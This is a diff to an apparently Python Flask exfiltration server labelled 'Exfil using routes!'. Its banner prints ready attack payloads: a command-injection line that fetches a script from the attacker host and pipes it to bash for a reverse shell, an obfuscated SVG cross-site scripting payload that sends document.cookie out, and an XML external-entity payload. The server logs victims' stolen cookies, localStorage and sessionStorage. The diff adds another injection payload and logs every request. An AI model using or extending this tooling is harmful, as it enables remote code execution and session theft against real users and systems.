@@ -19,10 +19,11 @@ l={}
 def banner():
  print("""
 \033[38;5;208m** Exfil using routes! **\033[0m
-🐚: $'\\x0a'curl${IFS}http://%s/rev/4444|bash
+🔗: curl${IFS}http://%s
+🐚: ||curl${IFS}http://%s/rev/4444|bash
 🍪: <svg%%0Conload="\\u0064ocument.write('<img%%0Csrc=http://%s?c='%%2b\\u0064ocument.cookie%%2b'>')"/>
 🗂️: Content-Type: text/xml <?xml version="1.0"?><!DOCTYPE x SYSTEM "http://%s/dtd"><x>&e1;</x>
-"""%(ip,ip,ip))
+"""%(ip,ip,ip,ip))
 
 def rev(p):
  s=socket.socket()
@@ -79,17 +80,15 @@ def dtd():
 @app.route('/',methods=['GET','POST'])
 def h():
  d=request.args.get('c')or request.get_data(as_text=True)or''
- if d:
-  p=d.split(',')
-  print('----------------------------------------------------')
-  print('\033[92mConnected\033[0m')
-  print('Host: '+request.remote_addr)
-  print('User-Agent: '+request.headers.get('User-Agent',''))
-  print('Cookies: '+(p[0]if len(p)>0 else''))
-  print('localStorage: '+(p[1]if len(p)>1 else''))
-  print('sessionStorage: '+(p[2]if len(p)>2 else''))
-  print('----------------------------------------------------')
-  print()
+ print('----------------------------------------------------')
+ print('\033[92mConnected\033[0m')
+ print('Host: '+request.remote_addr)
+ print('User-Agent: '+request.headers.get('User-Agent',''))
+ print('Cookies: '+(d.split(',')[0]if d else''))
+ print('localStorage: '+(d.split(',')[1]if len(d.split(','))>1 else''))
+ print('sessionStorage: '+(d.split(',')[2]if len(d.split(','))>2 else''))
+ print('----------------------------------------------------')
+ print()
  return'',204
 
 if __name__=="__main__":
